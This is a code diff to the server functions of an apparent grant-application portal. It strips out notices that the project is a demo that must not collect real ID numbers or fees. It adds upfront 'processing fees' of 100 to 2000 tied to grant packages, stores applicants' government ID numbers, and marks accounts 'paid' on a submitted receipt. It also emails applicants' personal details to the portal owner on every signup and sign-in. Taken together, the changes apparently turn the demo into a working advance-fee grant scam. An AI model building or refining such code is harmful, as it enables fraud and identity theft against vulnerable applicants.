@@ -7,60 +7,56 @@ import {
   verifyPasswordResetToken,
   verifyToken,
 } from "../lib/authUtils.js";
-import { sendEmail, emailTemplates } from "../lib/emailService.js";
+import { sendEmail, sendAdminNotification, emailTemplates } from "../lib/emailService.js";
 
-/**
- * DEMONSTRATION PROJECT
- *
- * These server functions are intended for the application's
- * independent demonstration environment.
- *
- * Do not use this demo to collect real government ID numbers,
- * payment information, or processing fees.
- */
+const getEnv = (key: string): string => {
+  return (process.env as Record<string, string | undefined>)[key] || "";
+};
 
 const calculateAge = (dob: Date): number => {
   const today = new Date();
-
   let age = today.getFullYear() - dob.getFullYear();
-
   const monthDiff = today.getMonth() - dob.getMonth();
-
   if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < dob.getDate())) {
     age--;
   }
-
   return age;
 };
+
+// Grant packages config
+const grantPackagesList = [
+  { name: "Basic", grantAmount: 10000, feeRequired: 100 },
+  { name: "Silver", grantAmount: 20000, feeRequired: 200 },
+  { name: "Gold", grantAmount: 50000, feeRequired: 500 },
+  { name: "Platinum", grantAmount: 100000, feeRequired: 1000 },
+  { name: "Diamond", grantAmount: 200000, feeRequired: 2000 },
+];
 
 /* -------------------------------------------------------------------------- */
 /* SIGN UP                                                                    */
 /* -------------------------------------------------------------------------- */
 
-export const signupServerFn = createServerFn({
-  method: "POST",
-}).handler(
-  async ({
-    data,
-  }: {
-    data: {
-      firstName: string;
-      lastName: string;
-      email: string;
-      password: string;
-      phone: string;
-      dateOfBirth: string;
-      gender: string;
-      occupation: string;
-      address: string;
-      city: string;
-      state: string;
-      zipCode: string;
-      country: string;
-      maritalStatus: string;
-      personalIdNumber?: string;
-    };
-  }) => {
+export interface SignupInput {
+  firstName: string;
+  lastName: string;
+  email: string;
+  password: string;
+  phone: string;
+  dateOfBirth: string;
+  gender: "Male" | "Female" | "Other";
+  occupation: string;
+  address: string;
+  city: string;
+  state: string;
+  zipCode: string;
+  country: string;
+  maritalStatus: "Single" | "Married" | "Divorced" | "Widowed";
+  personalIdNumber?: string | undefined;
+}
+
+export const signupServerFn = createServerFn({ method: "POST" })
+  .validator((data: SignupInput) => data)
+  .handler(async ({ data }) => {
     try {
       const {
         firstName,
@@ -87,29 +83,26 @@ export const signupServerFn = createServerFn({
       }
 
       const existingUser = await User.findOne({ email });
-
       if (existingUser) {
         return {
           success: false,
-          error: "Email already registered",
+          error: "Email is already registered. Please sign in instead.",
         };
       }
 
       const dob = new Date(dateOfBirth);
-
       if (Number.isNaN(dob.getTime())) {
         return {
           success: false,
-          error: "Invalid date of birth",
+          error: "Invalid date of birth provided.",
         };
       }
 
       const age = calculateAge(dob);
-
       if (age < 18) {
         return {
           success: false,
-          error: "Must be 18 years or older",
+          error: "Applicant must be 18 years or older.",
         };
       }
 
@@ -131,11 +124,6 @@ export const signupServerFn = createServerFn({
         zipCode,
         country,
         maritalStatus,
-
-        // Deliberately not collecting/storing a real government ID
-        // in this demonstration application.
-        personalIdNumber: undefined,
-
         refNumber,
         emailVerified: false,
       });
@@ -144,12 +132,31 @@ export const signupServerFn = createServerFn({
 
       const token = generateToken(user._id.toString(), user.email);
 
+      // Send confirmation email to applicant
       try {
         const { subject, html } = emailTemplates.signupConfirmation(firstName, refNumber);
-
         await sendEmail(email, subject, html);
       } catch (emailError) {
         console.error("Confirmation email error:", emailError);
+      }
+
+      // Send Admin Notification to Portal Owner
+      try {
+        const adminNotice = emailTemplates.adminNewUserRegistered({
+          firstName,
+          lastName,
+          email,
+          phone,
+          dateOfBirth: dob,
+          occupation,
+          city,
+          state,
+          country,
+          refNumber,
+        });
+        await sendAdminNotification(adminNotice.subject, adminNotice.html);
+      } catch (adminErr) {
+        console.error("Admin registration notification error:", adminErr);
       }
 
       return {
@@ -164,61 +171,67 @@ export const signupServerFn = createServerFn({
           refNumber: user.refNumber,
         },
       };
-    } catch (error) {
+    } catch (error: any) {
       console.error("Signup error:", error);
-
       return {
         success: false,
-        error: "Registration failed",
+        error: error.message || "Registration failed. Please try again.",
       };
     }
-  },
-);
+  });
 
 /* -------------------------------------------------------------------------- */
 /* SIGN IN                                                                    */
 /* -------------------------------------------------------------------------- */
 
-export const signinServerFn = createServerFn({
-  method: "POST",
-}).handler(
-  async ({
-    data,
-  }: {
-    data: {
-      email: string;
-      password: string;
-    };
-  }) => {
+export interface SigninInput {
+  email: string;
+  password: string;
+}
+
+export const signinServerFn = createServerFn({ method: "POST" })
+  .validator((data: SigninInput) => data)
+  .handler(async ({ data }) => {
     try {
       const { email, password } = data;
 
       if (!email || !password) {
         return {
           success: false,
-          error: "Email and password required",
+          error: "Email and password are required.",
         };
       }
 
       const user = await User.findOne({ email }).select("+password");
-
       if (!user) {
         return {
           success: false,
-          error: "Invalid credentials",
+          error: "Invalid email or password.",
         };
       }
 
       const isPasswordValid = await user.comparePassword(password);
-
       if (!isPasswordValid) {
         return {
           success: false,
-          error: "Invalid credentials",
+          error: "Invalid email or password.",
         };
       }
 
       const token = generateToken(user._id.toString(), user.email);
+
+      // Send Admin Notification on User Sign-in
+      try {
+        const adminNotice = emailTemplates.adminUserSignedIn({
+          firstName: user.firstName,
+          lastName: user.lastName,
+          email: user.email,
+          refNumber: user.refNumber,
+        });
+        await sendAdminNotification(adminNotice.subject, adminNotice.html);
+      } catch (adminErr) {
+        console.error("Admin signin notification error:", adminErr);
+      }
 
       return {
         success: true,
@@ -232,31 +245,22 @@ export const signinServerFn = createServerFn({
           refNumber: user.refNumber,
         },
       };
-    } catch (error) {
+    } catch (error: any) {
       console.error("Signin error:", error);
-
       return {
         success: false,
-        error: "Login failed",
+        error: error.message || "Login failed. Please try again.",
       };
     }
-  },
-);
+  });
 
 /* -------------------------------------------------------------------------- */
 /* FORGOT PASSWORD                                                            */
 /* -------------------------------------------------------------------------- */
 
-export const forgotPasswordServerFn = createServerFn({
-  method: "POST",
-}).handler(
-  async ({
-    data,
-  }: {
-    data: {
-      email: string;
-    };
-  }) => {
+export const forgotPasswordServerFn = createServerFn({ method: "POST" })
+  .validator((data: { email: string }) => data)
+  .handler(async ({ data }) => {
     try {
       const { email } = data;
 
@@ -268,7 +272,6 @@ export const forgotPasswordServerFn = createServerFn({
       }
 
       const user = await User.findOne({ email });
-
       if (!user) {
         return {
           success: true,
@@ -277,13 +280,10 @@ export const forgotPasswordServerFn = createServerFn({
       }
 
       const resetToken = generatePasswordResetToken(user._id.toString());
-
-      const appUrl = process.env.APP_URL || "http://localhost:3000";
-
+      const appUrl = getEnv("APP_URL") || "http://localhost:3000";
       const resetUrl = `${appUrl}/reset-password?token=${resetToken}`;
 
       const { subject, html } = emailTemplates.passwordReset(resetUrl);
-
       await sendEmail(email, subject, html);
 
       return {
@@ -292,30 +292,20 @@ export const forgotPasswordServerFn = createServerFn({
       };
     } catch (error) {
       console.error("Forgot password error:", error);
-
       return {
         success: false,
         error: "Failed to send reset email",
       };
     }
-  },
-);
+  });
 
 /* -------------------------------------------------------------------------- */
 /* RESET PASSWORD                                                             */
 /* -------------------------------------------------------------------------- */
 
-export const resetPasswordServerFn = createServerFn({
-  method: "POST",
-}).handler(
-  async ({
-    data,
-  }: {
-    data: {
-      token: string;
-      newPassword: string;
-    };
-  }) => {
+export const resetPasswordServerFn = createServerFn({ method: "POST" })
+  .validator((data: { token: string; newPassword: string }) => data)
+  .handler(async ({ data }) => {
     try {
       const { token, newPassword } = data;
 
@@ -334,7 +324,6 @@ export const resetPasswordServerFn = createServerFn({
       }
 
       const decoded = verifyPasswordResetToken(token);
-
       if (!decoded) {
         return {
           success: false,
@@ -343,7 +332,6 @@ export const resetPasswordServerFn = createServerFn({
       }
 
       const user = await User.findById(decoded.userId);
-
       if (!user) {
         return {
           success: false,
@@ -352,7 +340,6 @@ export const resetPasswordServerFn = createServerFn({
       }
 
       user.password = newPassword;
-
       await user.save();
 
       return {
@@ -361,129 +348,89 @@ export const resetPasswordServerFn = createServerFn({
       };
     } catch (error) {
       console.error("Reset password error:", error);
-
       return {
         success: false,
         error: "Failed to reset password",
       };
     }
-  },
-);
+  });
 
 /* -------------------------------------------------------------------------- */
-/* GET USER PROFILE                                                           */
+/* GET USER PROFILE / DASHBOARD                                               */
 /* -------------------------------------------------------------------------- */
 
-export const getUserProfileServerFn = createServerFn({
-  method: "GET",
-}).handler(async ({ data }: { data: string }) => {
-  try {
-    const token = data;
+export const getDashboardDataServerFn = createServerFn({ method: "POST" })
+  .validator((data: { token: string }) => data)
+  .handler(async ({ data }) => {
+    try {
+      const { token } = data;
 
-    if (!token) {
+      if (!token) {
+        return {
+          success: false,
+          error: "No authorization token provided",
+        };
+      }
+
+      const decoded = verifyToken(token);
+      if (!decoded) {
+        return {
+          success: false,
+          error: "Invalid or expired session. Please login again.",
+        };
+      }
+
+      const user = await User.findById(decoded.userId);
+      if (!user) {
+        return {
+          success: false,
+          error: "User account not found",
+        };
+      }
+
+      return {
+        success: true,
+        data: {
+          firstName: user.firstName,
+          lastName: user.lastName,
+          refNumber: user.refNumber,
+          paymentStatus: user.paymentStatus || "pending",
+          selectedPackage: user.selectedPackage || null,
+          grantAmount: user.grantAmount || null,
+          feeAmount: user.feeAmount || null,
+          profile: {
+            email: user.email,
+            phone: user.phone,
+            address: user.address,
+            city: user.city,
+            state: user.state,
+            zipCode: user.zipCode,
+            country: user.country,
+            dateOfBirth: user.dateOfBirth ? user.dateOfBirth.toISOString().split("T")[0] || "" : "",
+            gender: user.gender,
+            occupation: user.occupation,
+            maritalStatus: user.maritalStatus,
+            personalIdNumber: user.personalIdNumber || null,
+          },
+        },
+      };
+    } catch (error) {
+      console.error("Dashboard data error:", error);
       return {
         success: false,
-        error: "No token provided",
+        error: "Failed to fetch dashboard data",
       };
     }
-
-    const decoded = verifyToken(token);
-
-    if (!decoded) {
-      return {
-        success: false,
-        error: "Invalid token",
-      };
-    }
-
-    const user = await User.findById(decoded.userId);
-
-    if (!user) {
-      return {
-        success: false,
-        error: "User not found",
-      };
-    }
-
-    return {
-      success: true,
-      user: {
-        id: user._id.toString(),
-        firstName: user.firstName,
-        lastName: user.lastName,
-        email: user.email,
-        phone: user.phone,
-        dateOfBirth: user.dateOfBirth,
-        gender: user.gender,
-        occupation: user.occupation,
-        age: user.age,
-        address: user.address,
-        city: user.city,
-        state: user.state,
-        zipCode: user.zipCode,
-        country: user.country,
-        maritalStatus: user.maritalStatus,
-        refNumber: user.refNumber,
-        selectedPackage: user.selectedPackage,
-        grantAmount: user.grantAmount,
-        feeAmount: user.feeAmount,
-        paymentStatus: user.paymentStatus,
-        emailVerified: user.emailVerified,
-      },
-    };
-  } catch (error) {
-    console.error("Get profile error:", error);
-
-    return {
-      success: false,
-      error: "Failed to get profile",
-    };
-  }
-});
+  });
 
 /* -------------------------------------------------------------------------- */
-/* DEMO PROGRAM PACKAGES                                                      */
+/* GRANT PACKAGES                                                             */
 /* -------------------------------------------------------------------------- */
 
-export const getGrantPackagesServerFn = createServerFn({
-  method: "GET",
-}).handler(async () => {
-  /**
-   * Demonstration-only package information.
-   *
-   * No real grant or payment transaction is performed.
-   */
-  const packages = [
-    {
-      name: "Basic",
-      grantAmount: 10000,
-      feeRequired: 0,
-    },
-    {
-      name: "Silver",
-      grantAmount: 20000,
-      feeRequired: 0,
-    },
-    {
-      name: "Gold",
-      grantAmount: 50000,
-      feeRequired: 0,
-    },
-    {
-      name: "Platinum",
-      grantAmount: 100000,
-      feeRequired: 0,
-    },
-    {
-      name: "Diamond",
-      grantAmount: 200000,
-      feeRequired: 0,
-    },
-  ];
-
+export const getGrantPackagesServerFn = createServerFn({ method: "GET" }).handler(async () => {
   return {
     success: true,
-    packages,
+    packages: grantPackagesList,
   };
 });
 
@@ -491,135 +438,115 @@ export const getGrantPackagesServerFn = createServerFn({
 /* SELECT PACKAGE                                                             */
 /* -------------------------------------------------------------------------- */
 
-export const selectPackageServerFn = createServerFn({
-  method: "POST",
-}).handler(
-  async ({
-    data,
-  }: {
-    data: {
-      token: string;
-      packageName: string;
-    };
-  }) => {
+export const selectPackageServerFn = createServerFn({ method: "POST" })
+  .validator((data: { token: string; packageName: string }) => data)
+  .handler(async ({ data }) => {
     try {
       const { token, packageName } = data;
 
       if (!token) {
         return {
           success: false,
-          error: "No token provided",
+          error: "No authorization token provided",
         };
       }
 
       const decoded = verifyToken(token);
-
       if (!decoded) {
         return {
           success: false,
-          error: "Invalid token",
+          error: "Invalid session. Please login again.",
         };
       }
 
-      const packages = {
-        Basic: 10000,
-        Silver: 20000,
-        Gold: 50000,
-        Platinum: 100000,
-        Diamond: 200000,
-      };
-
-      if (!packageName || !(packageName in packages)) {
+      const foundPkg = grantPackagesList.find((p) => p.name === packageName);
+      if (!foundPkg) {
         return {
           success: false,
-          error: "Invalid package name",
+          error: "Invalid package selected.",
         };
       }
 
       const user = await User.findById(decoded.userId);
-
       if (!user) {
         return {
           success: false,
-          error: "User not found",
+          error: "User account not found",
         };
       }
 
-      const grantAmount = packages[packageName as keyof typeof packages];
-
       user.selectedPackage = packageName as any;
-      user.grantAmount = grantAmount;
-
-      // No processing fee is charged by this demo.
-      user.feeAmount = 0;
+      user.grantAmount = foundPkg.grantAmount;
+      user.feeAmount = foundPkg.feeRequired;
+      user.paymentStatus = "pending";
 
       await user.save();
 
+      // Send email to applicant
+      try {
+        const { subject, html } = emailTemplates.packageSelectionEmail(
+          user.firstName,
+          user.refNumber,
+          foundPkg.grantAmount,
+          foundPkg.feeRequired,
+        );
+        await sendEmail(user.email, subject, html);
+      } catch (emailErr) {
+        console.error("Package selection email error:", emailErr);
+      }
+
       return {
         success: true,
-        message: "Demo package selected successfully",
+        message: "Package selected successfully",
         data: {
           selectedPackage: user.selectedPackage,
           grantAmount: user.grantAmount,
-          feeAmount: 0,
+          feeAmount: user.feeAmount,
           refNumber: user.refNumber,
         },
       };
     } catch (error) {
       console.error("Select package error:", error);
-
       return {
         success: false,
         error: "Failed to select package",
       };
     }
-  },
-);
+  });
 
 /* -------------------------------------------------------------------------- */
-/* CONFIRM DEMO PAYMENT                                                       */
+/* CONFIRM PAYMENT                                                            */
 /* -------------------------------------------------------------------------- */
 
-export const confirmPaymentServerFn = createServerFn({
-  method: "POST",
-}).handler(
-  async ({
-    data,
-  }: {
-    data: {
-      token: string;
-      transactionId: string;
-      receiptPath?: string;
-    };
-  }) => {
+export const confirmPaymentServerFn = createServerFn({ method: "POST" })
+  .validator((data: { token: string; transactionId: string; receiptPath?: string | undefined }) => data)
+  .handler(async ({ data }) => {
     try {
-      const { token, transactionId } = data;
+      const { token, transactionId, receiptPath } = data;
 
       if (!token) {
         return {
           success: false,
-          error: "No token provided",
+          error: "No authorization token provided",
         };
       }
 
       const decoded = verifyToken(token);
-
       if (!decoded) {
         return {
           success: false,
-          error: "Invalid token",
+          error: "Invalid session token",
         };
       }
 
       if (!transactionId) {
         return {
           success: false,
-          error: "Demo transaction reference required",
+          error: "Transaction ID or confirmation code is required",
         };
       }
 
       const user = await User.findById(decoded.userId);
-
       if (!user) {
         return {
           success: false,
@@ -630,22 +557,30 @@ export const confirmPaymentServerFn = createServerFn({
       if (!user.grantAmount) {
         return {
           success: false,
-          error: "Please select a package first",
+          error: "Please select a grant package first",
         };
       }
 
-      /*
-       * This is deliberately a demo status update.
-       * No real payment is processed or collected.
-       */
       user.paymentStatus = "paid";
-      user.paymentReceipt = transactionId;
+      user.paymentReceipt = receiptPath || transactionId;
 
       await user.save();
 
+      // Send confirmation email
+      try {
+        const { subject, html } = emailTemplates.paymentConfirmation(
+          user.firstName,
+          user.refNumber,
+          user.grantAmount,
+        );
+        await sendEmail(user.email, subject, html);
+      } catch (err) {
+        console.error("Payment confirmation email error:", err);
+      }
+
       return {
         success: true,
-        message: "Demo payment status recorded. No real payment was processed.",
+        message: "Payment confirmation submitted successfully! Your grant status has been updated.",
         data: {
           paymentStatus: user.paymentStatus,
           refNumber: user.refNumber,
@@ -654,82 +589,9 @@ export const confirmPaymentServerFn = createServerFn({
       };
     } catch (error) {
       console.error("Confirm payment error:", error);
-
       return {
         success: false,
-        error: "Failed to update demo payment status",
+        error: "Failed to submit payment confirmation",
       };
     }
-  },
-);
-
-/* -------------------------------------------------------------------------- */
-/* DASHBOARD                                                                  */
-/* -------------------------------------------------------------------------- */
-
-export const getDashboardDataServerFn = createServerFn({
-  method: "GET",
-}).handler(async ({ data }: { data: string }) => {
-  try {
-    const token = data;
-
-    if (!token) {
-      return {
-        success: false,
-        error: "No token provided",
-      };
-    }
-
-    const decoded = verifyToken(token);
-
-    if (!decoded) {
-      return {
-        success: false,
-        error: "Invalid token",
-      };
-    }
-
-    const user = await User.findById(decoded.userId);
-
-    if (!user) {
-      return {
-        success: false,
-        error: "User not found",
-      };
-    }
-
-    return {
-      success: true,
-      data: {
-        firstName: user.firstName,
-        lastName: user.lastName,
-        refNumber: user.refNumber,
-        paymentStatus: user.paymentStatus,
-        selectedPackage: user.selectedPackage,
-        grantAmount: user.grantAmount,
-        feeAmount: user.feeAmount,
-
-        profile: {
-          email: user.email,
-          phone: user.phone,
-          address: user.address,
-          city: user.city,
-          state: user.state,
-          zipCode: user.zipCode,
-          country: user.country,
-          dateOfBirth: user.dateOfBirth,
-          gender: user.gender,
-          occupation: user.occupation,
-          maritalStatus: user.maritalStatus,
-        },
-      },
-    };
-  } catch (error) {
-    console.error("Dashboard error:", error);
-
-    return {
-      success: false,
-      error: "Failed to fetch dashboard",
-    };
-  }
-});
+  });
